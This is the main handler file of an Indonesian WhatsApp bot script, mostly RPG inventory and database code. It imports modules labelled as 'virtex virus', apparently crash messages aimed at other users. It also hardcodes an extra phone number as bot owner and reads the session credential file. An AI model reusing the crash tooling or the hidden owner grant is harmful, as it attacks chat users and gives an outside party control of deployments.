/* Development: ZaenarZaky */
/* Instagram: @zaenar2.0 */
/* Buy Sc Update: +6283188229366 */
/* ────────────────────────── */

require('./config')
const { decryptMedia } = require('@open-wa/wa-automate')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const nodemailer = require('nodemailer');
const _data = require('./zr.js')
const { modul } = require('./module');
const { ytdl } = modul;
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const fetch = require("node-fetch");
const os = require('os')
const crypto = require("crypto");
const fsx = require('fs-extra')
// Mengimpor modul didyoumean dan string-similarity
const didYouMean = require('didyoumean');
const stringSimilarity = require('string-similarity');

const bochil = require('@bochilteam/scraper')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const jsobfus = require('javascript-obfuscator')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { ChatAIHandler } = require('./lib/openai')
const { remini } = require('./lib/remini')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const canvafy = require('canvafy')
const { version } = require('./package.json');
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');

// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
    users: {},
    group: {},
    chats: {},
    tebakgambar: {},
    database: {},
    tebakkata: {},
    settings: {},
    donate: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
}
let tebakgambar = global.db.data.tebakgambar = []
let tebakkata = global.db.data.tebakkata = []
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let tebakbendera = db.data.game.bendera = []
let tebakbendera2 = db.data.game.bendera2 = []
let tebakkabupaten = db.data.game.kabupaten = []
let tebakkimia = db.data.game.kimia = []
let tebakasahotak = db.data.game.asahotak = []
let tebaksiapakahaku = db.data.game.siapakahaku = []
let tebaksusunkata = db.data.game.susunkata = []
let tebaktekateki = db.data.game.tekateki = []

moment.tz.setDefault("Asia/Jakarta").locale("id")

module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await conn.decodeJid(conn.user.id)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        const isCreator = [botNumber, ...global.owner, '6285762008398@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const from = mek.key.remoteJid
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
   
let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/avatar_contact.png')
    	    
//INI VIRUS VIRTEX!! [ CREATE BY ZKY ]
const { buttonkal } = require('./virtex/buttonkal') 	    
const { ngazap } = require('./virtex/ngazap')
const { philips } = require('./virtex/philips')
const { virus } = require('./virtex/virus')
//CLOCK STRING	    
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const isBan = banned.includes(m.sender)
const groupMembers = m.isGroup ? groupMetadata.participants : ''
//CLOCT
function clockString(ms) {
    let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
    let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
    let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
//REGISTER FUNCTION
const {
getRegisteredRandomId,
addRegisteredUser,
createSerial,
delRegister,
checkRegisteredUser,
NamaKamu,
UmurKamu
} = require('./database/register.js')

const isRegistered = checkRegisteredUser(m.sender)

//JOINRPG (SAMA.KEK REGISTER)
const {
getJoinRandomId,
addJoinUser,
createSerialJoin,
checkJoinUser
} = require('./database/joinrpg.js')

const isJoin = checkJoinUser(m.sender)

// Tanggal Ramadhan tahun ini (dalam format tanggal/bulan/tahun)
const tanggalRamadhan = new Date('2024-04-09');

// Fungsi untuk menghitung mundur waktu
function hitungMundurRamadhan() {
  const sekarang = new Date();
  const selisihWaktu = tanggalRamadhan - sekarang;

  const hari = Math.floor(selisihWaktu / (1000 * 60 * 60 * 24));
  const jam = Math.floor((selisihWaktu % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  const menit = Math.floor((selisihWaktu % (1000 * 60 * 60)) / (1000 * 60));
  const detik = Math.floor((selisihWaktu % (1000 * 60)) / 1000);
  
  return {
    hari,
    jam,
    menit,
    detik
  };
}

// Memanggil fungsi dan menampilkan hasilnya
const waktuMundur = hitungMundurRamadhan();


const texted = (type, text) => {
      switch (type) {
         case 'bold':
            return '*' + text + '*'
            break
         case 'italic':
            return '_' + text + '_'
            break
         case 'monospace':
            return '```' + text + '```'
      }
   }
async function sendImageMentionsBuffer(url, texts, quoted){

await conn.sendMessage(m.chat, { image: url , caption: texts, mentions: [...texts.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted })

}

const canva2 = require('canvas-hikki-2')
const canvas = require('canvas')
const canva = require('knights-canvas')
const levelling = require('./lib/levelling')

const threshold = 0.72

const role = () => {

let user = global.db.data.users[m.sender]

let role = (user.level <= 3) ? 'Warrior V'

        : ((user.level >= 3) && (user.level <= 6)) ? 'Warrior IV'

            : ((user.level >= 6) && (user.level <= 9)) ? 'Warrior III'

                : ((user.level >= 9) && (user.level <= 12)) ? 'Warrior II'

                    : ((user.level >= 12) && (user.level <= 15)) ? 'Warrior I'

                        : ((user.level >= 15) && (user.level <= 18)) ? 'Elite V'

                            : ((user.level >= 18) && (user.level <= 21)) ? 'Elite IV'

                                : ((user.level >= 21) && (user.level <= 24)) ? 'Elite III'

                                    : ((user.level >= 24) && (user.level <= 27)) ? 'Elite II'

                                        : ((user.level >= 27) && (user.level <= 30)) ? 'Elite I'

                                            : ((user.level >= 30) && (user.level <= 33)) ? 'Master V'

                                                : ((user.level >= 33) && (user.level <= 36)) ? 'Master IV'

                                                    : ((user.level >= 36) && (user.level <= 39)) ? 'Master III'

                                                        : ((user.level >= 39) && (user.level <= 42)) ? 'Master II'

                                                            : ((user.level >= 42) && (user.level <= 45)) ? 'Master I'

                                                                : ((user.level >= 45) && (user.level <= 48)) ? 'Grand Master V'

                                                                    : ((user.level >= 48) && (user.level <= 51)) ? 'Grand Master IV'

                                                                        : ((user.level >= 51) && (user.level <= 54)) ? 'Grand Master III'

                                                                            : ((user.level >= 54) && (user.level <= 57)) ? 'Grand Master II'

                                                                                : ((user.level >= 57) && (user.level <= 60)) ? 'Grand Master I'

                                                                                    : ((user.level >= 60) && (user.level <= 63)) ? 'Epic V'

                                                                                        : ((user.level >= 63) && (user.level <= 66)) ? 'Epic IV'

                                                                                            : ((user.level >= 66) && (user.level <= 69)) ? 'Epic III'

                                                                                                : ((user.level >= 69) && (user.level <= 71)) ? 'Epic II'

                                                                                                    : ((user.level >= 71) && (user.level <= 74)) ? 'Epic I'

                                                                                                        : ((user.level >= 74) && (user.level <= 77)) ? 'Legend V'

                                                                                                            : ((user.level >= 77) && (user.level <= 80)) ? 'Legend IV'

                                                                                                                : ((user.level >= 80) && (user.level <= 83)) ? 'Legend III'

                                                                                                                    : ((user.level >= 83) && (user.level <= 86)) ? 'Legend II'

                                                                                                                        : ((user.level >= 86) && (user.level <= 89)) ? 'Legend I'

                                                                                                                            : ((user.level >= 89) && (user.level <= 91)) ? 'Mythic V'

                                                                                                                                : ((user.level >= 91) && (user.level <= 94)) ? 'Mythic IV'

                                                                                                                                    : ((user.level >= 94) && (user.level <= 97)) ? 'Mythic III'

                                                                                                                                        : ((user.level >= 97) && (user.level <= 100)) ? 'Mythic II'

                                                                                                                                           : ((user.level >= 100) && (user.level <= 105)) ? 'Mythic I'      

                                                                                                                                              : ((user.level >= 105) && (user.level <= 120)) ? 'Mythical glory'

                                                                                                                                                 : ((user.level >= 120) && (user.level <= 130)) ? 'Mythical glory 700'

                                                                                                                                                    : ((user.level >= 150) && (user.level <= 160)) ? 'Mythical glory 800'

                                                                                                                                                        : ((user.level >= 160) && (user.level <= 170)) ? 'Mythical glory 900'

                                                                                                                                                            : ((user.level >= 170) && (user.level <= 185)) ? 'Mythical glory 1000'

                                                                                                                                                                : ((user.level >= 185) && (user.level <= 200)) ? 'Mythical glory 1100'

                                                                                                                                                                    : ((user.level >= 200) && (user.level <= 400)) ? 'Mythical glory 1200'

                                                                                                                                                                        : ((user.level >= 405) && (user.level <= 450)) ? 'Mythical glory 1300'

                                                                                                 : ((user.level >= 700) && (user.level <= 1000)) ? 'Mythical glory 100000'

                                                                                                                                                                        : 'God👑'

return role

}
   
let user = global.db.data.users[m.sender]

if (user) {
if (!isNumber(user.antispam)) user.antispam = 0
if (!isNumber(user.premiumDate)) user.premiumDate = -1
if (!('premium' in user)) user.premiumTime = 1
if (!('premium' in user)) user.premium = false
if (!('level' in user)) user.level = 0
if (!('autolevelup' in user)) user.autolevelup = true
if (!('cm' in user)) user.cm = 0
if (!('cl' in user)) user.cl = 0
if (!('cu' in user)) user.cu = 0
if (!('role' in user)) user.role = ''
if (!('cai' in user)) user.cai = ''
if (!('exp' in user)) user.exp = 100
if (!('darah' in user)) user.darah = 100
if (!('besi' in user)) user.besi = 10
if (!('emas' in user)) user.emas = 10
if (!('emerald' in user)) user.emerald = 10
if (!('potion' in user)) user.potion = 10
if (!('sword' in user)) user.sword = 0
if (!('armor' in user)) user.armor = 0
if (!('key' in user)) user.potion = 0
if (!('atm' in user)) user.atm = 0
if (!('money' in user)) user.money = 100
if (!('kucing' in user)) user.kucing = 0
if (!('anjing' in user)) user.anjing = 0
if (!('anjingexp' in user)) user.anjingexp = 0    
if (!('kucingexp' in user)) user.kucingexp = 0    
if (!('nagaexp' in user)) user.nagaexp = 0     
if (!('kyubiexp' in user)) user.kyubiexp = 0     
if (!('bibitapel' in user)) user.bibitapel = 0
if (!('bibitmangga' in user)) user.bibitmangga = 0
if (!('bibitjeruk' in user)) user.bibitjeruk = 0
if (!('bibitpisang' in user)) user.bibitpisang = 0
if (!('bibitanggur' in user)) user.bibitanggur = 0
if (!('jeruk' in user)) user.jeruk = 0
if (!('anggur' in user)) user.anggur = 0
if (!('pisang' in user)) user.pisang = 0
if (!('mangga' in user)) user.mangga = 0
if (!('apel' in user)) user.apel = 0
if (!('codemail' in user)) user.codemail = ''
if (!('kyubi' in user)) user.kyubi = 0
if (!('naga' in user)) user.naga = 0
if (!('rubah' in user)) user.rubah = 0
if (!('serigala' in user)) user.serigala = 0
if (!('kuda' in user)) user.kuda = 0
if (!('elang' in user)) user.elang = 0
if (!('feedpet' in user)) user.feedpet = 0
if (!('regp' in user)) user.regp = false
if (!('bar' in user)) user.bar = 100
if (!('rename' in user)) user.rename = 0
} else global.db.data.users[m.sender] = {
antispam: 0,
level: 0,
darah: 100,
autolevelup: true,
bar: 100,
besi: 10,
regp: false,
cai: '',
codemail: '',
bibitanggur: 0,
bibitapel: 0,
bibitpisang: 0,
bibitmangga: 0,
bibitjeruk: 0,
apel: 0,
anggur: 0,
mangga: 0,
pisang: 0,
jeruk: 0,
cm: 0,
atm: 0,
kucing: 0,
naga: 0,
feedpet: 0,
kuda: 0,
kyubi: 0,
anjing: 0,
elang: 0,
rubah: 0,
elang: 0,
serigala: 0,
cl: 0,
cu: 0,
emas: 10,
emerald: 10,
potion: 10,
sword: 0,
armor: 0,
key: 0,
role: '',
money: 100,
rename: 0,
premiumTime: 1,
premium: false,
exp: 100
}   
   
async function levelUp(avatar) {

const image = await new canva.Up()

.setAvatar(avatar)

.toAttachment();

const data = image.toBuffer();

return data

}

const isPremium = global.db.data.users[m.sender].premium

const isRenameCard = global.db.data.users[m.sender].rename


async function progres(avatar, nama, expneed, expnow, levelnow, ){

const image = await new canva.Rank()

    .setAvatar(avatar)

    .setUsername(nama)

    .setBg("https://telegra.ph/file/43e18c0d3cac8d8877b51.jpg")

    .setNeedxp(expneed)

    .setCurrxp(expnow)

    .setLevel(levelnow)

    .setRank("https://i.ibb.co/Wn9cvnv/FABLED.png") 

    .toAttachment();

  data = image.toBuffer();

  return data

  }
  
  

 
const level = global.db.data.users[m.sender].level
       
var levelorang = `-`

if (isRegistered) {

var levelorang = level

}    

db.data.users[m.sender].role = role()

var rolenya = `-`

if (isRegistered) {

var rolenya = role()

}

const addexp = () => {

const addexp = db.data.users[m.sender].exp += 20

return addexp

}
if (command && budy) {
addexp()
}

const addMonay = (sender, amount) => {
const addM = db.data.users[sender].money += amount
return addM
}

const kurangMonay = (sender, amount) => {
const kurM = db.data.users[sender].money -= amount
return kurM
}

const getMonay = (sender) => {
const cekM = db.data.users[sender].money
return cekM
}

const addDarah = (sender, amount) => {
const addD = db.data.users[sender].darah += amount
return addD
}

const kurangDarah = (sender, amount) => {
const kurD = db.data.users[sender].darah -= amount
return kurD
}

const getDarah = (sender) => {
const cekD = db.data.users[sender].darah
return cekD
}

const addBar = (sender, amount) => {
const addB = db.data.users[sender].bar += amount
return addB
}

const kurangBar = (sender, amount) => {
const kurB = db.data.users[sender].bar -= amount
return kurB
}

const getBar = (sender) => {
const cekB = db.data.users[sender].bar
return cekB
}  

const addBesi = (sender, amount) => {
const addB = db.data.users[sender].besi += amount
return addB
}

const kurangBesi = (sender, amount) => {
const kurB = db.data.users[sender].besi -= amount
return kurB
}

const getBesi = (sender) => {
const cekB = db.data.users[sender].besi
return cekB
}

const addEmas = (sender, amount) => {
const addM = db.data.users[sender].emas += amount
return addM
}

const kurangEmas = (sender, amount) => {
const kurM = db.data.users[sender].emas -= amount
return kurM
}

const getEmas = (sender) => {
const cekM = db.data.users[sender].emas
return cekM
}

const addEmerald = (sender, amount) => {
const addM = db.data.users[sender].emerald += amount
return addM
}

const kurangEmerald = (sender, amount) => {
const kurM = db.data.users[sender].emerald -= amount
return kurM
}

const getEmerald = (sender) => {
const cekM = db.data.users[sender].emerald
return cekM
}

const addPotion = (sender, amount) => {
const addM = db.data.users[sender].potion += amount
return addM
}

const kurangPotion = (sender, amount) => {
const kurM = db.data.users[sender].potion -= amount
return kurM
}

const getPotion = (sender) => {
const cekM = db.data.users[sender].potion
return cekM
}

const addCM = (sender, amount) => {
const addM = db.data.users[sender].cm += amount
return addM
}

const kurangCM = (sender, amount) => {
const kurM = db.data.users[sender].cm -= amount
return kurM
}

const getCM = (sender) => {
const cekM = db.data.users[sender].cm
return cekM
}

const addCL = (sender, amount) => {
const addM = db.data.users[sender].cl += amount
return addM
}

const kurangCL = (sender, amount) => {
const kurM = db.data.users[sender].cl -= amount
return kurM
}

const getCL = (sender) => {
const cekM = db.data.users[sender].cl
return cekM
}

const addCU = (sender, amount) => {
const addM = db.data.users[sender].cu += amount
return addM
}

const kurangCU = (sender, amount) => {
const kurM = db.data.users[sender].cu -= amount
return kurM
}

const getCU = (sender) => {
const cekM = db.data.users[sender].cu
return cekM
}

const addKucing = (sender, amount) => {
const addB = db.data.users[sender].kucing += amount
return addB
}

const kurangKucing = (sender, amount) => {
const kurB = db.data.users[sender].kucing -= amount
return kurB
}

const getKucing = (sender) => {
const cekB = db.data.users[sender].kucing
return cekB
}

const addNaga = (sender, amount) => {
const addB = db.data.users[sender].naga += amount
return addB
}

const kurangNaga = (sender, amount) => {
const kurB = db.data.users[sender].naga -= amount
return kurB
}

const getNaga = (sender) => {
const cekB = db.data.users[sender].naga
return cekB
}

const addKyubi = (sender, amount) => {
const addB = db.data.users[sender].anjing += amount
return addB
}

const kurangKyubi = (sender, amount) => {
const kurB = db.data.users[sender].anjing -= amount
return kurB
}

const getKyubi = (sender) => {
const cekB = db.data.users[sender].anjing
return cekB
}

const addAnjing = (sender, amount) => {
const addB = db.data.users[sender].anjing += amount
return addB
}

const kurangAnjing = (sender, amount) => {
const kurB = db.data.users[sender].anjing -= amount
return kurB
}

const getAnjing = (sender) => {
const cekB = db.data.users[sender].anjing
return cekB
}

const addKuda = (sender, amount) => {
const addB = db.data.users[sender].kuda += amount
return addB
}

const kurangKuda = (sender, amount) => {
const kurB = db.data.users[sender].kuda -= amount
return kurB
}

const getKuda = (sender) => {
const cekB = db.data.users[sender].kuda
return cekB
}

const addElang = (sender, amount) => {
const addB = db.data.users[sender].elang += amount
return addB
}

const kurangElang = (sender, amount) => {
const kurB = db.data.users[sender].elang -= amount
return kurB
}

const getElang = (sender) => {
const cekB = db.data.users[sender].elang
return cekB
}

const addRubah = (sender, amount) => {
const addB = db.data.users[sender].rubah += amount
return addB
}

const kurangRubah = (sender, amount) => {
const kurB = db.data.users[sender].rubah -= amount
return kurB
}

const getRubah = (sender) => {
const cekB = db.data.users[sender].rubah
return cekB
}

const addSerigala = (sender, amount) => {
const addB = db.data.users[sender].serigala += amount
return addB
}

const kurangSerigala = (sender, amount) => {
const kurB = db.data.users[sender].serigala -= amount
return kurB
}

const getSerigala = (sender) => {
const cekB = db.data.users[sender].serigala
return cekB
}

const addKey = (sender, amount) => {
const addB = db.data.users[sender].key += amount
return addB
}

const kurangKey = (sender, amount) => {
const kurB = db.data.users[sender].key -= amount
return kurB
}

const getKey = (sender) => {
const cekB = db.data.users[sender].key
return cekB
}

const addArmor = (sender, amount) => {
const addB = db.data.users[sender].armor += amount
return addB
}

const kurangArmor = (sender, amount) => {
const kurB = db.data.users[sender].armor -= amount
return kurB
}

const getArmor = (sender) => {
const cekB = db.data.users[sender].armor
return cekB
}

const addSword = (sender, amount) => {
const addB = db.data.users[sender].sword += amount
return addB
}

const kurangSword = (sender, amount) => {
const kurB = db.data.users[sender].sword -= amount
return kurB
}

const getSword = (sender) => {
const cekB = db.data.users[sender].sword
return cekB
}
const isMonay = getMonay(m.sender)  
  
   
//FIX DATABASE RPG YANG KE MEMEK
function antiemror(){

  let useret = global.db.data.users[m.sender]

    if ((useret.money * 1) > 999999999999999999) {

        useret.money = 999999999999999999

    } else if ((useret.money * 1) < 0) {

        useret.money = 0

    }

    if (useret.money == NaN) {

    	useret.money = 0

    }
    }
   
   
if (isRegistered && m.sender && isCreator && !isCreator) {
antiemror()
}   
   
   
   
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const doc = await fs.readFileSync('./session/creds.json')

const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getBotol, addBotol, kurangBotol, getKardus, addKardus, kurangKardus, getKaleng, addKaleng, kurangKaleng, getKelinci, getDomba, getSapi, getGajah } = require('./storage/user/buruan')
const { cekMakananJson, addInvMakanan, addSate, kurangSate, getSate, addGoreng, kurangGoreng, getGoreng, addSop, kurangSop, getSop, addSteak, kurangSteak, getSteak } = require('./storage/user/makanan')
const { cekBuahJson, addInvBuah, addBibitApel, kurangBibitApel, getBibitApel, addBibitBuah, kurangBibitBuah, getBibitBuah, addBuah, kurangBuah, getBuah, addApel, kurangApel, getApel, addDitanam, kurangDitanam, getDitanam, addDitanam1, kurangDitanam1, getDitanam1 } = require('./storage/user/buah')
const { cekWarungJson, addInvWarung, addPermen, kurangPermen, getPermen, addEs, kurangEs, getEs, addPedas, kurangPedas, getPedas, addRingan, kurangRingan, getRingan } = require('./storage/user/warung')
const { cekBuildJson, addInvBuild, addRumah, kurangRumah, getRumah, addPertanian, kurangPertanian, getPertanian, addWarung, kurangWarung, getWarung } = require('./storage/user/build')
const { cekBahanJson, addInvBahan, addKayu, kurangKayu, getKayu, addBatu, kurangBatu, getBatu, addSemen, kurangSemen, getSemen, addPasir, kurangPasir, getPasir } = require('./storage/user/bahan')

  





function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
}

function isNumber(x) {
    return !isNaN(x);
}

function generateRandomCharacter() {
    const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    return characters[Math.floor(Math.random() * characters.length)];
}

async function createOtpCanvas(avatar) {
    const codetext = Array.from({ length: 4 }, generateRandomCharacter).join('');
    const captchaBuffer = await new canvafy.Captcha()
        .setBackground("image", "https://cdn.discordapp.com/attachments/1087030211813593190/1110243947311288530/beeautiful-sunset-illustration-1212023.webp")
        .setCaptchaKey(codetext.toString())
        .setBorder("#f0f0f0")
        .setOverlayOpacity(0.7)
        .build();
    const securityBuffer = await new canvafy.Security()
        .setAvatar(avatar)
        .setBackground("image", "https://cdn.discordapp.com/attachments/1087030211813593190/1110243947311288530/beeautiful-sunset-illustration-1212023.webp")
        .setCreatedTimestamp(Date.now())
        .setSuspectTimestamp(1)
        .setBorder("#f0f0f0")
        .setLocale("id") // country short code - default "en"
        .setAvatarBorder("#f0f0f0")
        .setOverlayOpacity(0.9)
        .build();
    return {
        image: captchaBuffer,
        otp: codetext,
        verified: securityBuffer
    };
}




let DarahAwal =  global.rpg.darahawal
let BarAwal = 100
const isDarah = getDarah(m.sender)
const isBar = getBar(m.sender)
const isCekDarah = getDarah(m.sender)
const isCekBar = getBar(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isBotol = getBotol(m.sender)
const isCM = getCM(m.sender)
const isTanamApel = getDitanam(m.sender)
const isTanamBuah = getDitanam1(m.sender)
const isSate = getSate(m.sender)
const isKey = getKey(m.sender)
const isGoreng = getGoreng(m.sender)
const isSop = getSop(m.sender)
const isSteak = getSteak(m.sender)
const isCU = getCU(m.sender)
const isCL = getCL(m.sender)
const isBibitApel = getBibitApel(m.sender)
const isBibitBuah = getBibitBuah(m.sender)
const isApel = getApel(m.sender)
const isSword = getSword(m.sender)
const isArmor = getArmor(m.sender)
const isBuah = getBuah(m.sender)
const isRumah = getRumah(m.sender)
const isPertanian = getPertanian(m.sender)
const isWarung = getWarung(m.sender)
const isEs = getEs(m.sender)
const isPedas = getPedas(m.sender)
const isPermen = getPermen(m.sender)
const isRingan = getRingan(m.sender)
const isKaleng = getKaleng(m.sender)
const isKardus = getKardus(m.sender)
const isAyam = getAyam(m.sender)
const isBatu = getBatu(m.sender)
const isKucing = getKucing(m.sender)
const isKayu = getKayu(m.sender)
const isSemen = getSemen(m.sender)
const isPasir = getPasir(m.sender)
const isNaga = getNaga(m.sender)
const isAnjing = getAnjing(m.sender)
const isKyubi = getKyubi(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInvMakanan = cekMakananJson(m.sender)
const isInvBahan = cekBahanJson(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInvWarung = cekWarungJson(m.sender)
const isInvBuild = cekBuildJson(m.sender)
const isInvBuah = cekBuahJson(m.sender)
const ikan = ['🐬','🐡','🐠']


let _buruan = JSON.parse(fs.readFileSync('./storage/user/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/darah.json'))
let _datauser = JSON.parse(fs.readFileSync('./database/registered.json'))
//SALDO INI KONTOL
const { addSaldo, minSaldo, cekSaldo } = require("./database/deposit");
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));

//INI FUNCTION SALDO
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}




        // Game



           
        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const tanggall = moment.tz('Asia/Jakarta').format('DD/MM/YY')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = '👋 Selamat Malam️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = '👋 Selamat Petang'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = '👋 Selamat Sore'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = '👋 Selamat Siang️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = '👋 Selamat Pagi'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = '👋 Selamat Subuh'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = '👋 Selamat Tengah Malam'
        }

        const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `Arybotz - Development`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;riell,;;;\nFN:${global.wm}\nitem1.TEL;waid=${owner}:+${nomerowner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
        
        
const ini_mark = `0@s.whatsapp.net`        
        
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await conn.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i)}\nFN:${await conn.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	const yts = require("yt-search");
        // Database Tambahan!!

        let prem = JSON.parse(fs.readFileSync('./database/premium.json'))
               let daftar = JSON.parse(fs.readFileSync('./database/daftar.json'))
        let ban = JSON.parse(fs.readFileSync('./database/banned.json'))
        let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))
        let db_error = JSON.parse(fs.readFileSync('./database/error.json'));
